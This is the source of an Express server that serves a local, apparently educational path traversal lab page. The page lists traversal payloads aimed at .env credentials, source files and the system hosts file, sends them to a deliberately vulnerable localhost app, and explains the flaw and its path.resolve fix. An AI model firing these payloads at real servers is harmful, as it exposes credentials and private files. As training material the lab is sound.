/*
 * Terminal 2: cd demo-attacked/path-traversal && npm run guide
 */

const express = require('express');

const app = express();
const PORT = 3044;
const VICTIM_PORT = 3043;
const PROTECTED_PORT = 3045;

const PAYLOADS = [
  { id: 'p0', payload: 'q2-report.txt', target: 'uploads/q2-report.txt', impact: 'Baseline — normal download' },
  { id: 'p1', payload: '../package.json', target: 'path-traversal/package.json', impact: 'Exposes dependencies + app metadata' },
  { id: 'p2', payload: '../victim-server.js', target: 'victim-server.js', impact: 'Reads the server\'s own source code' },
  { id: 'p3', payload: '../../.gitignore', target: 'Root .gitignore', impact: 'Confirms directory structure' },
  { id: 'p4', payload: '../.env', target: '.env (if exists)', impact: 'Database credentials, API keys' },
  { id: 'p5', payload: '../../../../Windows/System32/drivers/etc/hosts', target: 'System hosts file (Windows)', impact: 'OS-level file access' },
];

const SWITCHER_CSS = `
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #ef4444;
    }`;

const DASHBOARD_STYLE = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    ${SWITCHER_CSS}`;

const LAB_EXTRA_STYLE = `
    input.field {
      background: #111;
      border: 1px solid #1a3a1a;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 0.82rem;
      padding: 0.4rem 0.6rem;
      border-radius: 4px;
    }
    .result-banner {
      padding: 0.6rem 1rem;
      border-radius: 4px;
      font-size: 0.82rem;
      margin-top: 0.75rem;
      display: none;
    }
    .result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
    .result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
    .result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
    pre.decoded-box {
      background: #0a0a0a;
      border: 1px solid #1a3a1a;
      border-radius: 4px;
      padding: 0.75rem;
      font-size: 0.78rem;
      color: #cbd5e1;
      white-space: pre-wrap;
      word-break: break-all;
      margin-top: 0.5rem;
    }`;

function buildPayloadRows() {
  return PAYLOADS.map(function (row) {
    return (
      '<tr>' +
        '<td><code id="' + row.id + '">' + row.payload + '</code></td>' +
        '<td>' + row.target + '</td>' +
        '<td>' + row.impact + '</td>' +
        '<td><button type="button" class="demo-btn btn-copy" data-target="' + row.id + '">Copy</button></td>' +
      '</tr>'
    );
  }).join('');
}

function buildGuideHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Path Traversal Attack Lab</title>
  <style>${DASHBOARD_STYLE}${LAB_EXTRA_STYLE}</style>
</head>
<body>
  <h1>📂 Path Traversal Attack Lab — FileVault</h1>
  <p class="subtitle">path.join() with user input — ../ escapes the uploads directory</p>

  <div class="credentials-panel">
    <h2>Credentials</h2>
    <table>
      <thead><tr><th>Field</th><th>Value</th></tr></thead>
      <tbody>
        <tr><td>Target</td><td>http://localhost:${VICTIM_PORT}</td></tr>
        <tr><td>Username</td><td>alice / alice123</td></tr>
        <tr><td>Vulnerable endpoint</td><td>GET /api/download?file=</td></tr>
      </tbody>
    </table>
  </div>

  <div class="flow-box">
    <strong>Step 1 — Login</strong><br><br>
    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap">
      <input class="field" id="login-user" value="alice" style="width:120px">
      <input class="field" id="login-pass" value="alice123" type="password" style="width:120px">
      <button class="demo-btn" id="btn-login">Login → :${VICTIM_PORT}</button>
    </div>
    <div class="result-banner" id="login-result"></div>
    <div style="margin-top:0.5rem;font-size:0.78rem;color:#64748b">Token stored — fetch requests below will use it automatically.</div>
  </div>

  <div class="flow-box">
    <strong>💀 Traversal Payloads</strong><br><br>
    <table>
      <thead><tr><th>Payload</th><th>Target file</th><th>Impact</th><th></th></tr></thead>
      <tbody>${buildPayloadRows()}</tbody>
    </table>
    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap;margin-top:1rem">
      <label style="font-size:0.82rem;color:#94a3b8">file=</label>
      <input class="field" id="traversal-input" value="../package.json" style="flex:1;min-width:200px">
      <button class="demo-btn" id="btn-fetch">GET /api/download?file=</button>
    </div>
    <div class="result-banner" id="fetch-result"></div>
    <pre class="decoded-box" id="fetch-output" style="min-height:120px;white-space:pre-wrap;word-break:break-all">Response will appear here</pre>
    <div style="font-size:0.78rem;color:#64748b;margin-top:0.4rem">
      Request: <span id="live-url" style="color:#00ff41">http://localhost:${VICTIM_PORT}/api/download?file=../package.json</span>
    </div>
  </div>

  <div class="flow-box">
    <strong>🔍 Why It Works</strong><br><br>
    <pre class="decoded-box">path.join(__dirname, 'uploads', filename)

When filename = '../package.json':

  __dirname             = /path/to/demo-attacked/path-traversal
  'uploads'             = /path/to/demo-attacked/path-traversal/uploads
  + '../package.json'

path.join normalizes:  uploads/../package.json
                     = /path/to/demo-attacked/path-traversal/package.json

The file exists → server reads and returns it.
path.join does NOT check whether the result is inside 'uploads/'.</pre>
  </div>

  <div class="flow-box">
    <strong>✅ The Fix</strong><br><br>
    <pre class="decoded-box">// Resolve both paths to absolute, then verify containment
const uploadsDir = path.resolve(__dirname, 'uploads');
const requestedPath = path.resolve(uploadsDir, filename);

// startsWith check: is the resolved path still inside uploads/?
if (!requestedPath.startsWith(uploadsDir + path.sep)) {
  return res.status(403).json({ error: 'Access denied: path traversal detected' });
}
// Only now is it safe to read the file</pre>
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (${VICTIM_PORT})</button>
    <button type="button" class="btn-protected" id="btn-switcher-protected">Protected (${PROTECTED_PORT})</button>
  </div>

  <script>
    var authToken = null;

    function showBanner(id, type, msg) {
      var el = document.getElementById(id);
      el.className = 'result-banner ' + type;
      el.textContent = msg;
      el.style.display = 'block';
    }

    document.getElementById('traversal-input').addEventListener('input', function() {
      document.getElementById('live-url').textContent =
        'http://localhost:${VICTIM_PORT}/api/download?file=' + encodeURIComponent(this.value);
    });

    document.querySelectorAll('.btn-copy').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var id = btn.getAttribute('data-target');
        var text = document.getElementById(id).textContent;
        navigator.clipboard.writeText(text).then(function() {
          document.getElementById('traversal-input').value = text;
          document.getElementById('live-url').textContent =
            'http://localhost:${VICTIM_PORT}/api/download?file=' + encodeURIComponent(text);
          btn.textContent = 'Copied!';
          setTimeout(function() { btn.textContent = 'Copy'; }, 1500);
        });
      });
    });

    document.getElementById('btn-login').addEventListener('click', async function() {
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: document.getElementById('login-user').value,
            password: document.getElementById('login-pass').value
          })
        });
        var data = await res.json();
        if (!res.ok) { showBanner('login-result', 'failure', '✗ ' + data.error); return; }
        authToken = data.token;
        showBanner('login-result', 'success', '✓ Logged in as ' + data.user.username);
      } catch(e) { showBanner('login-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-fetch').addEventListener('click', async function() {
      if (!authToken) { showBanner('fetch-result', 'failure', '✗ Login first'); return; }
      var file = document.getElementById('traversal-input').value;
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/download?file=' + encodeURIComponent(file), {
          headers: { 'Authorization': 'Bearer ' + authToken }
        });
        var data = await res.json();
        if (res.ok) {
          showBanner('fetch-result', 'success', '✓ File read: ' + data.filename + ' (' + data.content.length + ' bytes)');
          document.getElementById('fetch-output').textContent = data.content;
        } else {
          showBanner('fetch-result', 'failure', '✗ ' + data.error);
          document.getElementById('fetch-output').textContent = '';
        }
      } catch(e) { showBanner('fetch-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-switcher-vulnerable').addEventListener('click', function() {
      window.open('http://localhost:${VICTIM_PORT}', '_blank');
    });
    document.getElementById('btn-switcher-protected').addEventListener('click', function() {
      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
    });
  </script>
</body>
</html>`;
}

app.get('/', function (req, res) {
  res.send(buildGuideHtml());
});

app.listen(PORT, function () {
  console.log('Path Traversal Attack Lab running at http://localhost:' + PORT);
});
